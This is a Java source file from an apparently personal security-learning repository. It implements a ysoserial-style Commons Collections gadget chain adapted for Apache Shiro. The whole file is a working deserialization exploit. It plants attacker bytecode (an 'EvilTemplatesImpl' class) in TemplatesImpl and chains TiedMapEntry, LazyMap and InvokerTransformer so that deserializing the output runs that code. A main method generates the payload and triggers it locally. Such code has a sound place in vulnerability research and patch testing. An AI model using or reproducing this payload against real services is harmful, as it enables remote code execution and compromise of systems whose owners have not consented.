package com.xjjlearning.hack.java.ysoserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.xjjlearning.hack.java.classloader.bytecodes.EvilTemplatesImpl;
import com.xjjlearning.hack.java.ysoserial.payloads.util.ClassUtil;
import com.xjjlearning.hack.java.ysoserial.payloads.util.SerializationUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Map;
import java.util.Optional;

import static com.xjjlearning.hack.java.ysoserial.payloads.util.ReflectionUtil.setFieldValue;



/**
 * 	Gadget chain:
 * 	    java.io.ObjectInputStream.readObject()
 *             java.util.HashSet.readObject()
 *                 java.util.HashMap.put()
 *                 java.util.HashMap.hash()
 *                     org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
 *                     org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
 *                         org.apache.commons.collections.map.LazyMap.get()
 *                             org.apache.commons.collections.functors.InvokerTransformer.transform()
 *                                com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer()
 *                                com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance()
 *                                com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.defineTransletClasses()
 *                                com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.TransletClassLoader.defineClass()
 *                                EvilTemplatesImpl.java -> static
 */

/*
  created by xjj on 2023/2/4
 */
public class CommonCollectionsShiro {
    // 由于在复现shiro的时候发现传入数组不行(InvokerTransformer[]) 于是修改payload
    public byte[] getPayload(String exp) throws Exception {
        class A extends TransformerFactoryImpl {
        }

        byte[] code = ClassUtil.classAsBytes(EvilTemplatesImpl.class);

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "");
        setFieldValue(templates, "_bytecodes", new byte[][]{code});
        setFieldValue(templates, "_tfactory", new A());

        Transformer transformer = new InvokerTransformer("getClass", null, null);

        Map outerMap = LazyMap.decorate(new HashMap(), transformer);

        HashMap obj = new HashMap();

        /**
         * TiedMapEntry(map, key) -> TiedMapEntry.getValue() -> map.get()
         */
        obj.put(new TiedMapEntry(outerMap, templates), "");
        outerMap.clear();

        setFieldValue(transformer, "iMethodName", "newTransformer");

        Optional<byte[]> b = SerializationUtil.serialize(obj);
        return b.get();
    }

    public static void main(String[] args) throws Exception {
        byte[] payload = new CommonCollectionsShiro().getPayload("");
        SerializationUtil.deserialize(payload);
    }
}
